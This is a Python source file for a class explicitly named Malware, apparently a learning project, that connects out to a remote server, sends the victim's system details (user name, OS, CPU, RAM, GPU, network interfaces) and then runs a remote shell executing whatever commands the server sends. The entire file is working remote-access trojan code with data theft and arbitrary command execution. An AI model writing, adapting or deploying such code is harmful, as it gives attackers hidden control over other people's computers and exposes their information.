# -*- coding: utf-8 -*-
import socket
import sys
import os
try:
    import wmi
except ImportError as e:
    print(f"Error : {e}")
    print(f"Please install {e.name} library using the requirements.txt")
    sys.exit(1)
try:
    import psutil
except ImportError as e:
    print(f"Error : {e}\n")
    print(f"Please install {e.name} library using the requirements.txt")
    sys.exit(1)
import uuid
import json
import getpass
import subprocess


class Connection():

    def __init__(self, ip="localhost", port=60000):
        self.ip = ip
        self.port = port
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def connect(self):
        try:
            self.s.connect((self.ip, self.port))
            print("Connected to remote server !")
            return True
        except Exception as e:
            print(f"Error : {e}")
            return False

    def sending(self, message):
        message = message.encode("utf-8")
        try:
            self.s.send(message)
        except Exception as e:
            print(f"Error : {e}")
            return "exit"

    def receive(self):
        try:
            self.msg = self.s.recv(1024).decode("utf-8")
        except socket.timeout:
            return "exit"
        return self.msg

    def close(self):
        try:
            self.s.close()
        except Exception as e:
            print(f"Error : {e}")


class Malware():

    def __init__(self, ip="localhost", port=60000):
        self.connection = Connection(ip, port)

    def start(self):
        if self.connection.connect():
            self.handle_commands()
        else:
            self.exit()

    def handle_commands(self):
        messagercv = None
        while messagercv != "exit":
            messagercv = self.connection.receive()
            if messagercv == "InfoSystem":
                self.get_info()
            elif messagercv == "shell_att":
                self.remote_shell(messagercv)
        self.exit()

    def get_info(self):
        # pour une question de compréhension et facilité de lecture les noms ont été changé
        computer = wmi.WMI()
        os_info = computer.Win32_OperatingSystem()[0]
        proc_info = computer.Win32_Processor()[0]
        gpu_info = computer.Win32_VideoController()[0]
        os_name = os_info.Name.split('|')[0]
        os_version = ' '.join([os_info.Version, os_info.BuildNumber])
        ram = round(float(os_info.TotalVisibleMemorySize) /
                    1048576)  # KB to GB
        addrs = psutil.net_if_addrs()
        user = getpass.getuser()

        data = {
            "infosys": {
                "os_name": os_name,
                "os_version": os_version,
                "user": user,
                "cpu": proc_info.Name,
                "ram": ram,
                "gpu": gpu_info.Name,
                "interface": addrs
            }
        }
        self.connection.sending(json.dumps(data))

    def remote_shell(self, command):
        self.connection.sending(os.getcwd())
        command = self.connection.receive()
        while command.lower() != "quit":
            if "cd" in command:
                path = os.getcwd()
                try:
                    os.chdir(command.split(" ")[1])
                    path = os.getcwd()
                except:
                    pass
                self.connection.sending(path)
            elif command.lower() == "exit" or command.lower() == "":
                self.connection.sending("Unauthorised command ! ")
            else:
                output = subprocess.getoutput(command)
                self.connection.sending(output)

            command = self.connection.receive()

    def exit(self):
        self.connection.close()
        print("Exiting . . .")


malware = Malware()
try:
    malware.start()
except Exception as e:
    print(f"Error : {e}")
